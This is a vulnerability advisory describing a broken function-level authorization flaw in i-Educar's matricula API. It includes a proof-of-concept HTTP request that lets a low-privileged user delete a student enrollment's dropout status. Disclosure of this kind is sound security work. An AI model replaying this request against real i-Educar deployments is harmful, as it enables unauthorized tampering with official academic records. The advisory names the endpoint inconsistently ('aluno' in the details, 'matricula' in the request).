# Broken Function Level Authorization on `matricula` API allows deletion of “abandono” status

### Summary

A **Broken Function Level Authorization (BFLA)** vulnerability was identified in the `matricula` API of the **i-Educar** application. This issue allows low-privileged users to delete the **“abandono”** (dropout) status of arbitrary student enrollments by manipulating request parameters.

---

### Details

**Vulnerable Endpoint:**  
`GET /module/Api/aluno`

The application fails to enforce authorization checks to ensure that only privileged users (e.g., administrators) can perform sensitive operations like deleting an abandonment status. By altering the `id` parameter, an attacker can affect records that do not belong to them.

---
### Proof of Concept (PoC)

1. Authenticate as a non-privileged user.

<img width="1380" height="528" alt="image" src="https://github.com/user-attachments/assets/02cd535d-8784-4caf-bb89-08ca04895a91" />

<img width="846" height="616" alt="image" src="https://github.com/user-attachments/assets/92bf93a9-38d6-49be-b911-0e5e06da59f9" />

2. Send the following request:

```
GET /module/Api/matricula?&oper=delete&resource=abandono&id=206 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://localhost/intranet/educar_matricula_det.php?cod_matricula=206
Cookie: i_educar_session=Mz9IKWGOP641g4BLkSGRnxs69wk4ChmUUxUerX19
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

```



3. We could observe that the deletion was successful.

<img width="1574" height="542" alt="image" src="https://github.com/user-attachments/assets/aa537a63-20d8-4586-afad-9342380ac332" />

---

### Impact

- **Unauthorized deletion of academic records:** Any low-privileged or compromised account can remove critical status information (e.g., “abandono”) from student enrollments.
    
- **Integrity violation:** Enables tampering with academic data, which can affect official records.
      

This vulnerability directly compromises the **integrity** of the system and could have legal/regulatory implications due to unauthorized modification of academic records.


---

## Discoverer

[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)
